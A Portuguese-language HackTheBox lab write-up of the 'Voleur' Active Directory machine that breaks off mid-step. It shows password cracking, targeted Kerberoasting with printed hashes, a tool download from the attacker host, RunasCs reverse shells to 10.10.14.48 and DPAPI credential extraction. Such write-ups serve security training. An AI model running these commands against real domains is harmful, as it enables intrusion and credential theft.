---
title: "Voleur - HTB"
date: 2025-10-30
summary: "As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt"
layout: "single"
tags: ["Windows", "Medium", "HTB"]
---

## Resumo

A Voleur é uma máquina de nível Medium focada em **Windows/Active Directory (AD)**. É uma máquina divertida pois ela possui diversos passos interessantes de se explorar. Iniciamos com um usuário que nos permite acessar uma share do SMB que contém um arquivo com senha que contém credenciais de duas contas de serviços no AD. Com uma dessas contas conseguimos realizar um ataque de `Kerberoasting` e acesso a outra conta de serviço. Outra conta de serviço obtida anteriormente permite nós restaurarmos um usuário deletado que contém um DPAPI com dados salvos. Dentro desse DPAPI conseguimos credenciais de outro usuário que leva a uma chave SSH, e por fim, conseguimos realizar um `Secretsdump` para obter a hash do **Administrator**. 


## User Flag

### Recon Inicial

#### Brutando o arquivo XLSX e obtendo a senha do **SVC_LDAP** e SVC_IIS

Como descrito na descrição da box, ja iniciamos com um usuário e senha: `ryan.naylor:HollowOct31Nyt`, usaremos ele para iniciar o recon e entender o que temos de disponivel para utilizar.

Como sempre, estarei utilizando o [Rustscan](https://github.com/bee-san/RustScan) pra realizar a enumeração inicial com o objetivo de encontrar portas abertas e o nome do AD/DOMAIN:

```
> rustscan -a 10.129.102.81 -u 5000 -- -sV

Nmap scan report for 10.10.11.76
Host is up, received echo-reply ttl 127 (0.15s latency).
Scanned at 2025-07-05 16:10:05 -03 for 58s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-06 03:10:12Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2222/tcp  open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52560/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62338/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
62339/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62341/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62364/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
```

{{< alert >}}
**SEMPRE que rodar o Rustscan/Nmap, adicione o domain encontrado no seu arquivo `/etc/hosts` para não ter problemas de DNS. E SEMPRE que for possível, coloque o `dc.DOMINIO.htb` ANTES do `DOMINIO.htb`.**
{{< /alert >}}

Encontramos várias portas padrões de máquinas Windows, apenas uma chamou a minha atenção: a porta 2222 que está rodando um SSH, porém não temos como fazer nada por hora, então prosseguimos com a enumeração do AD usando o nosso usuário.

Ao tentar logar no SMB usando as credenciais disponibilizadas, descobrimos que a autenticação com `NTLM` está desativada, então para essa máquina precisaremos utilizar somente TGT/TGS para conseguir se autenticar no Kerberos:

```bash
> nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt'
SMB         10.129.102.81   445    10.129.102.81    [*]  x64 (name:10.129.102.81) (domain:10.129.102.81) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.102.81   445    10.129.102.81    [-] 10.129.102.81\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

Para utilizar o Kerberos pelo Linux, precisaremos configurar o `/etc/krb5.conf` e o `/etc/hosts`:

```bash
#/etc/krb5.conf
[realms]
        VOLEUR.HTB = {
                kdc = dc.voleur.htb
        }
```

```bash
#/etc/hosts
10.129.102.81   dc.voleur.htb voleur.htb
```

{{< alert >}}
**Sempre que precisarmos utilizar o Kerberos em uma máquina, NUNCA utilize o endereço IP da máquina, o Kerberos só trabalha utilizando DNS, ou seja, ao invés de usar 10.129.102.81, sempre utilizaremos dc.voleur.htb ou voleur.htb, fica a dica.**
{{< /alert >}}

Com isso configurado, ao tentarmos solicitar o ticket com `getTGT.py` do [Impacket](https://github.com/fortra/impacket), recebemos o erro de Clock skew:

```bash
> getTGT.py voleur.htb/ryan.naylor:'HollowOct31Nyt'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Esse erro sempre acontece quando o horário da sua máquina está diferente do horário do Kerberos. Tem várias maneiras de corrigir isso, no meu caso estarei usando o [Faketime](https://packages.debian.org/sid/faketime):

```bash
> faketime "$(rdate -n voleur.htb -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

O faketime irá abrir uma shell nova com o horário sincronizado com o horário do AD, com isso conseguimos se autenticar normalmente. Podemos agora solicitar o ticket com o `getTGT.py`:

```bash
> getTGT.py -dc-ip "dc.voleur.htb" voleur.htb/ryan.naylor:'HollowOct31Nyt'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache
```

Irei usar também o `kinit` para solicitar um TGT completo por via das duvidas:

```bash
> kinit ryan.naylor@VOLEUR.HTB
Password for ryan.naylor@VOLEUR.HTB: 

> klist  
Ticket cache: FILE:ryan.naylor.ccache
Default principal: ryan.naylor@VOLEUR.HTB

Valid starting       Expires              Service principal
07/09/2025 02:02:44  07/09/2025 12:02:44  krbtgt/VOLEUR.HTB@VOLEUR.HTB
	renew until 07/10/2025 02:02:40

```

Com o ticket do **RYAN.NAYLOR**, podemos enumerar as shares utilizando o [Netexec](https://www.netexec.wiki/):

```bash
> KRB5CCNAME=ryan.naylor.ccache nxc smb dc.voleur.htb -k -u ryan.naylor -p 'HollowOct31Nyt' --shares

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share                               
```

Aqui nos deparamos com uma share interessante, a `IT`. Podemos entrar nela e ver que tipo de arquivo ela compartilha. Para isso podemos usar o `smbclient`:

```bash
> smbclient //dc.voleur.htb/IT --use-kerberos=required --use-krb5-ccache=/workspace/ryan.naylor.ccache

...

smb: \First-Line Support\> ls
  .                                   D        0  Wed Jan 29 06:40:17 2025
  ..                                  D        0  Wed Jan 29 06:10:01 2025
  Access_Review.xlsx                  A    16896  Thu Jan 30 11:14:25 2025

		5311743 blocks of size 4096. 893859 blocks available

smb: \First-Line Support\> get Access_Review.xlsx
getting file \First-Line Support\Access_Review.xlsx of size 16896 as Access_Review.xlsx (28.1 KiloBytes/sec) (average 28.1 KiloBytes/sec)
```

Dentro da share IT encontramos um arquivo `xlsx`, baixando ele e tentando abrir, descobrimos que ele possui senha:

![xlsx](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761865819/24f0809d-95b7-4f2a-985b-e9147892c293.png)

Podemos tentar um ataque de força bruta nesse arquivo, para isso irei usar o [office2john](https://gist.github.com/luca-m/42e9a556a8b621bb181456067785358c) e a wordlist rockyou:

```bash
> office2john.py Access_Review.xlsx > hash             
> john --wordlist=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:07 DONE (2025-07-09 02:14) 0.1318g/s 103.3p/s 103.3c/s 103.3C/s football1..lolita
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Abrindo o arquivo xlsx, encontramos as seguintes informações:

![users](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761865929/c9ab7224-ebea-4adb-ad78-e0860eb66074.png)

Aqui temos algumas informações valiosas, que são:

- Existia um usuário chamado **TODD.WOLFE** que foi **DELETADO**, e sua senha é `NightT1meP1dg3on14`;
- O usuário **LACEY.MILLER** e o **TODD.WOLFE** tem acesso nível `Second-Line Support Technician`;
- **JEREMY.COMBS** tem acesso nível `Third-Line Support Technician`;
- ****SVC_LDAP**** tem a senha `M1XyC9pW7qT5Vn`;
- **SVC_IIS** tem a senha `N5pXyW1VqM7CZ8`;
- A senha do **SVC_BACKUP** está com o **JEREMY.COMBS**.

#### Utilizando de um Kerberoasting para obter o SVC_WINRM

Com essas informações, podemos ir para o bloodhound. Irei utilizar o [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) para scannear o AD e gerar um zip para digerir no [bloodhound-legacy](https://github.com/SpecterOps/BloodHound-Legacy):

```bash
KRB5CCNAME=ryan.naylor.ccache bloodhound-python -k -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -ns 10.129.102.81 -c ALL --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 29S
INFO: Compressing output into 20250709012536_bloodhound.zip
```

Olhando as permissões do **RYAN.NAYLOR**, não encontramos nada útil:

![ryan](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761866135/f3b18746-4fa3-4480-875c-c05d8c0e292b.png)

Porém como vimos anteriormente, nós temos as senhas do ****SVC_LDAP**** e do **SVC_IIS**:

![svc-iis](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761866251/4c375420-0754-4071-b426-261465881bdc.png)


O **SVC_IIS** não tem nada interessante, porém o ****SVC_LDAP**** tem bem mais coisas interessantes. Temos a permissão `WriteSPN` sobre o **SVC_WINRM**, `GenericWrite` sobre a **LACEY.MILLER** e somos parte do grupo ****RESTORE_USERS****.

![svc-ldap](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761866643/9796d710-6672-448a-9488-e576dfd87b70.png)

A permissão `WriteSPN` nos permite realizar um ataque de Kerberoasting. Esse ataque consiste em solicitar tickets de contas de serviço de dentro do AD para tentar quebrar a hash localmente e descobrir a senha do serviço. 

Para abusar dessa permissão, podemos usar o `TargetedKerberoast.py` usando o ticket do ****SVC_LDAP****:

```bash
> getTGT.py voleur.htb/**SVC_LDAP**:'M1XyC9pW7qT5Vn'

> KRB5CCNAME=**SVC_LDAP**.ccache targetedKerberoast.py -v -d "voleur.htb" --dc-host "dc.voleur.htb" -o Kerberoastables.txt -k
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Writing hash to file for (lacey.miller)
[VERBOSE] SPN removed successfully for (lacey.miller)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Writing hash to file for (svc_winrm)
[VERBOSE] SPN removed successfully for (svc_winrm)

```

Com isso conseguimos as hashs do **SVC_WINRM** e da **LACEY.MILLER**:

```bash
> cat Kerberoastables.txt 

$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$97bdc5a8f3d51ea4ed1b2cd2263d3a8d$04f633f7c3154f8f9356b16fffb2a7c874a34aa04c05ea68a00d6839cd399dc62b9e1b6075521237eeec199e149536d43f705937f3bbd0d0652cafed6f016a831daa7d7c02e94a87c197ad2d7162329aa90a1416ef01c2deac25512ec258873c15a0ec16014e33feb0d5209efdfa5196dd548ccea43b6c3bdd780de25719c79517d0b551a3f9dd95d187a61ad05c2b53b3a95b43602204f23913a99b1a4f636a494ed2c9fb3dd2fb84cebd6392c577d6fe21cc7481bfa60fad816c4bc579037a779da3d4fe21a3f5c5f1f15a640bf7b1d5be0e82c50e507d72ad2ca7bb4ead901357cecd0c7b34c93313dcdce044fdcf1c2911b30f7fbd14a6fad0cbd70643f30bdcad316d2658010de0615a43912e7f832d8bf8e6b3b51f5e46811170477c16f932414a9f526ccbab6936ff97668b6fff75cd6116be5474aa456e08d28346646bdcefc25aabf16b832f4ce943e0f71426c8e14b37d74626697fd1fe98defc41155a236476cd4a89621866a5bd113e49c9227a3fe4ce9293c4020d8bee68bf70e5e431446eb2972c76d7a93dab3af2d104493db52440a7ac5a388dc27d1f518085e95da913aa6a56917a823842c41dddce278a39054c08ef5196c811f067cce70d948a4945c1b6f477bcc86687f65c053c17e75f073b89831dd212d2f3c43e82be11cf02f2468fbcf4e55892657c67e757869bbc0fb93d0b58743a65cd545f7a736f2b308d8d88e73045006a98c62d4a00ab68946585eab2f577badf88d5e2ded59d37e1e603cbaec6c0354db4e5a563b5a2b82ea11cbc8202d107130da1f6995af8b4af4b9ea7e78511f0ac177fe7a2cf2f4af8011073a9ea852559bb68eff7559f21d700600b3b2510d3ab661437e3da8c9adb724c92c8b3ceeac8842ea2a7cd54afe68a0993f21227a658ff55fcc77e9e2c424f2cf736e70065479226372b7aea24f6ccf2646ebdb264ec643f5687bf087ccb85b5da00da1954f70ebaa88d2215caa79b5b5fb0c49f0140ccb11b311d43c54260dc1ca7a7e2ad7c497eb93e3b84b143340b940993fa376ca183eb418bad0b792ec98303942da9cf0f09d09969c36323fdfc90dca698a3df146712a5662ec8534366f2577c3e7ad9b1d9550ee37ee5fc5650dcd81950a43fb4b61ede40d5ccb2d3e24c79242b923cf8f02d05a7d0257dff1326cc2566422abc935c83ba7600d21487f56984dfb2718ff330422b0aefed46c440058e366b1f271bfa251e101b19f389f32e10fb2015652f190810b20943b1473122f82d0b8cd34e7a3481f5947090e56016fef414324b20b47c6de3b6182601c2c00c6de053dbba03c5d12c5844e9ab38568c33a0b9c08f539c845ad791fe5f68890319a31fd03a40ce74a3166a8e164b477691a43299338ffdcdecd326003ba76ff4478100b608a8186b65b9049930f032b8cd7145fab3b8788b97ae77f90e9c2fdb48ac8bd2a128daf79e7e
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$a3322ddc9b0a1a68300b287d0add2ad6$3ff323083e3a932dcf6c719b340dc14cb2a1aacef2cae416ea18a8b43bc8c9142732625afaecf8a1bc5c132358ce814455681afd982d5218b8d03d8184062677c5be828c2b15ff91d64793743737259dfa58e58cd25d0e6b86a9be5304cb485e49f69831d4b9e54dff5b3e26189efe35c0da2f13c687c2dd276171b204243302ba5cb20b33975307d3d79d7bc0a18906662b9c2cbc490521754a9166161705c2c62d867a6cd594a43c6ce040feeff0c67911904c48e103c54bf9d5c5805b222c1408a2e2ba05418625c7903872426708ba71c4cb95497d9e0e764b7b9b4e2a3939c088a890d1339b822d86f49c0f1492b55ca8c159234d301eb7b52f44e1d626fc81a848ddab2fd01eb9e56a692683be543dc871022a4d986478ef7f3b147e0770b5a83d7ae612df5438254a73767b0888c8c6907490149eec97f38f0f2993cd457fb43e1e78658acbb94c581560aedb016f6cb6deb41eb94abca1bae33af45439af1ad4262c8bc48f5fb2b4c1695522e1cace63748379eb3b7b5936877dd9e249f3d61d19c26ce13546b3619ca87a2eb4866e89f8d77906296ac3995181c15e6b15eb44107e08908faabe73d8c111494c27ce339cb07cc570d53196a9b6664fc9dc9b1ff308ce361043949ca1be60cbeb36ecbfb96a602935576bc38d129603f4ffc9bfc85dc5bef81733c90fa60c811e830c090e7b149a728c75447659e4987ea9c7435e393a19224112e4561a6011117fe33a92717fc5f1eb7b3ec324a36c2df46fbfef23a7daef77050f99ec408841ca8baa994d5615dd1f924a9cd333c0ce54d0cb4a55049feef039c783b3bad5ec130785e73da2ccce0537b9150c255d734a2da01e487a2da3837c327f6777f4872e9dceada3462a13ed2140dfbcb0b7047b879df4a0c9303896c495aae7a97f682a85c506cfcc47f402c5ac52c22dede2f620758c122c23c64d851346634b6729d185679e11fe37a0681be6a0c6b64e8d9bec15459ab1e20b7e32ea9275558e2d45027bc31d7ce0508b7df1456962ee1c7229c297e82cc0a5a3400b787e1c928030a6a9adf990f5f300cfa0f7b4cc2a931dd5e853947f0aa5dfe2fe34be989e5c2104b5482cde644c1c42bd5dbf224ebe3fd0a49221b3444e2bdc9df1688d4af2082ee02a4ac00ddd1bc7f645824695fd00f4681f87a524990bc5d4c117ef314b6f1e851f8ccacfd4ea3f614d3bc8f970c4a704ad8e15aede98541caae883139c03d59b183bd2f78ec101e27aff907df6c9257596abad53197fa9be8406f359e5d12e6f277426335a11be66606ed48e837c53511b10a1df64480b67871fb3a16150b6cd663fa408847307a987d3cd481b77df3397f9451c5e58f5fb201647a09638c4999a2a75fcc57dd785fe1923e6a072b5a397edbedc3b4dd99260b88feecd42d3e50aad2a38c78bcc444f51eb9ef55bea9a01bb2863a2d651a8defcea9cac0395
```

Podemos usar o `hashcat` ou o `john` para quebrar as hashs, nesse caso irei usar o `john` mesmo:

```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt Kerberoastables.txt 

Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:12 DONE (2025-07-09 03:52) 0.07788g/s 1117Kp/s 2010Kc/s 2010KC/s !!123sabi!!123..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Com isso conseguimos a senha do **SVC_WINRM**, podemos solicitar um TGT, logar no powershell remoto e pegar a user flag:

```bash
> kinit svc_winrm@VOLEUR.HTB         
Password for svc_winrm@VOLEUR.HTB: 

> evil-winrm -i "dc.voleur.htb" -r VOLEUR.HTB
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cat ../Desktop/user.txt
2782644bd5bc78c03846d47ba58b504e
```

## Root Flag

### Obtendo a shell do SVC_LDAP

Voltando para o `bloodhound` e o arquivo `xlsx` que encontramos na share `IT`, vemos que o **SVC_LDAP** faz parte do grupo **RESTORE_USERS**, e existe um usuário chamado **TODD.WOLFE** deletado:

Porém o **SVC_LDAP** não possui a permissão ps_remote (que permitiria logarmos usando o `Evil-Winrm`), só que nós temos a senha dele, então nesse caso podemos usar o [RunasCs]() e rodar comandos na shell dele. Então com isso podemos conseguir uma reverse shell do **SVC_LDAP**.

Para fazermos isso, primeiro vamos enviar o `RunasCs` para a máquina:

```bash
> *Evil-WinRM* PS C:\Users\svc_winrm\Documents> Invoke-WebRequest -Uri http://10.10.14.48:9090/_RunasCs.exe -Outfile runas.exe

> *Evil-WinRM* PS C:\Users\svc_winrm\Documents> ls

    Directory: C:\Users\svc_winrm\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/9/2025  12:10 AM          53248 runas.exe

```

Para abrir uma reverse shell, usamos o `RunasCs` da seguinte maneira:

```bash
> *Evil-WinRM* PS C:\Users\svc_winrm\Documents> ./runas.exe **SVC_LDAP** 'M1XyC9pW7qT5Vn' powershell -r 10.10.14.48:4444 
[*] Warning: The logon for user '**SVC_LDAP**' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-8ae0a3$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 620 created in background.

```

E com o listener aberto, conseguimos a shell do **SVC_LDAP**:

```bash
> rlwrap nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.102.81.
Ncat: Connection from 10.129.102.81:53763.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> 

```

### Restaurando o usuário TODD.WOLFE

Como o **SVC_LDAP** faz parte do grupo **RESTORE_USERS**, podemos listar usuários no modo “tombstone” no AD. Esse modo tombstone é semelhante a uma "lixeira de usuários", todo usuário deletado fica nesse "modo" por um certo tempo, depois ele é deletado completamente. Para listar usuários nesse modo, podemos utilizar o seguinte comando:

```bash
> Get-ADObject -Filter * -IncludeDeletedObjects

...

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db

...
```

Irá aparecer vários usuários, porém o interessante é o **TODD.WOLFE**. Para restaurar ele, usamos o comando:

```bash
> Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db"
```

Com isso, restauramos o **TODD.WOLFE**. Assim como o **SVC_LDAP** que não tem a permissão de logar remotamente, o **TODD.WOLFE** também não possui. Então precisaremos utilizar novamente o `RunasCs` para obter uma reverse shell:

```bash
> *Evil-WinRM* PS C:\Users\svc_winrm\Documents> ./runas.exe todd.wolfe 'NightT1meP1dg3on14' powershell -r 10.10.14.48:5555
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-8ae0a3$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1428 created in background.
```

```bash
> rlwrap nc -lvnp 5555
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.129.102.81.
Ncat: Connection from 10.129.102.81:53822.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> 
```

### Extraindo o DPAPI do TODD.WOLFE para obter a senha do JEREMY.COMBS

Com a shell do **TODD.WOLFE**, podemos acessar a pasta `IT/Second-Line Support/Archived Users`, la existe uma pasta chamada `todd.wolfe`, que aparenta ser um backup da pasta de usuário do **TODD.WOLFE**:

```bash
> PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> ls

    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---         1/29/2025   7:13 AM                3D Objects                                                           
d-r---         1/29/2025   7:13 AM                Contacts                                                             
d-r---         1/30/2025   6:28 AM                Desktop                                                              
d-r---         1/29/2025   7:13 AM                Documents                                                            
d-r---         1/29/2025   7:13 AM                Downloads                                                            
d-r---         1/29/2025   7:13 AM                Favorites                                                            
d-r---         1/29/2025   7:13 AM                Links                                                                
d-r---         1/29/2025   7:13 AM                Music                                                                
d-r---         1/29/2025   7:13 AM                Pictures                                                             
d-r---         1/29/2025   7:13 AM                Saved Games                                                          
d-r---         1/29/2025   7:13 AM                Searches                                                             
d-r---         1/29/2025   7:13 AM                Videos         
```

Olhando as pastas, vemos que na `Desktop` existe um atalho do `Microsoft Edge`, e normalmente quanto existe um arquivo `.lnk` em uma máquina de CTF, significa que um browser foi utilizado por esse usuário, o que levanta suspeitas de dados salvos no `DPAPI`. 

Seguindo o post do [The Hackers Recipe](https://www.thehacker.recipes) a respeito de [DPAPI secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#dpapi-secrets), podemos extrair as senhas salvas utilizando o **DPAPI (Data Protection API)**, que é um componente interno nos sistemas Windows.

Para extrair esses dados, precisamos pegar a chave e os dados criptografados e baixar localmente. A chave fica no diretório:

```bash
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

Nesse caso, ela fica em:

```bash
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88
```

E os dados criptografados ficam em:

```bash
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

Nesse caso:

```bash
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Local\Microsoft\Credentials
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials
```

Para baixar os arquivos, devemos converter em base64 e copiar. Para isso usamos os comando:

```bash
# CHAVE
> [Convert]::ToBase64String((Get-Content -Path "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88" -Encoding Byte -Raw))

# DADOS
> [Convert]::ToBase64String((Get-Content -Path "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3" -Encoding Byte -Raw))

```

Com os dois arquivos baixados e decodificados de volta do base64, podemos descriptografa-los com o `dpapi.py`. Para isso usaremos o seguinte comando:

```bash
# CHAVE
> dpapi.py masterkey -file chave -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

```bash
# DADOS
> dpapi.py credential -file dados -key '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Com isso conseguimos a senha do **JEREMY.COMBS** e consequentemente o ticket TGT dele. 

### Obtendo a chave do SSH e obtendo a hash do Administrator

Com a conta do **JEREMY.COMBS**, temos acesso a pasta `Third-Line Support` na share `IT`:

```bash
> smbclient //dc.voleur.htb/IT --use-kerberos=required --use-krb5-ccache=/tmp/krb5cc_0               
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 06:10:01 2025
  ..                                DHS        0  Mon Jun 30 18:08:33 2025
  Third-Line Support                  D        0  Thu Jan 30 13:11:29 2025

		5311743 blocks of size 4096. 885469 blocks available
smb: \> cd "Third-Line Support"
smb: \Third-Line Support\> ls
  .                                   D        0  Thu Jan 30 13:11:29 2025
  ..                                  D        0  Wed Jan 29 06:10:01 2025
  id_rsa                              A     2602  Thu Jan 30 13:10:54 2025
  Note.txt.txt                        A      186  Thu Jan 30 13:07:35 2025

		5311743 blocks of size 4096. 885469 blocks available
smb: \Third-Line Support\> 

```

Aqui encontramos uma chave SSH e uma nota escrito:


>Jeremy,<br><br>
